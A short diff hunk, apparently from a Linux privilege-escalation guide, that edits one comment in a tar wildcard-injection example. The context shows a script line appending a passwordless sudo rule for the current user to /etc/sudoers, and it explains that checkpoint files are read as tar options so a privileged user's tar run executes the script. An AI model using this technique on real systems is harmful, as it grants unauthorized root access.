@@ -391,7 +391,7 @@ echo '$(whoami) ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
 EOF
 chmod +x privesc.sh
 
-# 4. Wait for the tar command to be executed by the privileged user
+# 4. Wait for the tar command to be executed by a privileged user
 # The checkpoint files will be interpreted as tar options, executing the script
 ```
 > - https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa
